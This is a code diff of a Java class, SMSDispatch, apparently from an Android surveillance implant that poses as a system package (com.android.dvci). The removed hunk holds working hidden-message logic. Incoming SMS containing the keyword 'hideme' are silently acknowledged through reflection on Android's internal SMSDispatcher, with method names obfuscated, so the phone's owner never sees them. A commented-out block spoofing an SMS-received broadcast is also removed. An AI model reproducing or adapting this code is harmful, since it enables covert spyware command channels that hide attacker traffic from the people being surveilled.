@@ -26,12 +26,8 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.LowEventHandlerDefs;
 import com.android.dvci.util.Reflect;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
-
-
-/*
- * Code tested on 4.0 and 4.4.2
- */
 
 
 public class SMSDispatch {
@@ -61,68 +57,12 @@ public class SMSDispatch {
 					Check.log(TAG + s1.getOriginatingAddress());
 					Check.log(TAG + s1.getClass().getCanonicalName());
 				}
-				if (s1.getMessageBody().toLowerCase().contains("hideme")) {
-					try {
-						this.callOrig = false;
-						if (Cfg.DEBUG) {
-							Check.log(TAG +" hide");
-						}
-						Reflect r = Reflect.on(M.e("com.android.internal.telephony.SMSDispatcher"));
-						if (Cfg.DEBUG) {
-							Check.log(TAG +" called on");
-						}
-						if (r != null) {
-							if (r.get() != null) {
-								//private void notifyAndAcknowledgeLastIncomingSms(boolean success,int result, Message response)
-								if (Cfg.DEBUG) {
-									Check.log(TAG +" calling notifyAndAcknowledgeLastIncomingSms");
-								}
-								r.call(M.e("notifyAndAcknowledgeLastIncomingSms"), true, RESULT_SMS_HANDLED, null);
-							} else {
-								if (Cfg.DEBUG) {
-									Check.log(TAG +" calling notifyAndAcknowledgeLastIncomingSms");
-								}
-							}
-						}
-					} catch (Exception e) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG +" Exception", e);
-						}
-					}
-				} else {
 					this.callOrig = true;
-				}
 			}
-			/*
-			if (pdus != null) {
-				Intent intent = new Intent("android.provider.Telephony.SMS_RECEIVED");
-				intent.putExtra("pdus", pdus);
-				intent.putExtra("format", "3gpp");
-				// get a context
-				Application a = getcon();
-				// send intent
-				a.sendBroadcast(intent," android.permission.RECEIVE_SMS");
-				Log.d(TAG, a.toString());
-			}
-			*/
 		}
 	}
 
 
-	/**
-	 * Sleep.
-	 *
-	 * @param t ms to msleep
-	 */
-	public static void msleep(final int t) {
-		try {
-			Thread.sleep(t);
-		} catch (final InterruptedException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " sleep() throwed an exception");//$NON-NLS-1$
-			}
-		}
-	}
 
 	static int hexCharToInt(char c) {
 		if (c >= '0' && c <= '9') return (c - '0');
@@ -272,7 +212,7 @@ public class SMSDispatch {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + ".");
 				}
-				msleep(100);
+				Utils.sleep(100);
 			}
 			if (!(sender.isBound() && sender.isConnected())) {
 				if (Cfg.DEBUG) {
@@ -325,12 +265,12 @@ public class SMSDispatch {
 						Check.log(TAG + " (getAvailable) Error: ", e);//$NON-NLS-1$
 					}
 				}
-				msleep(100);
+				Utils.sleep(100);
 			}
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
 			}
-			msleep(100);
+			Utils.sleep(100);
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
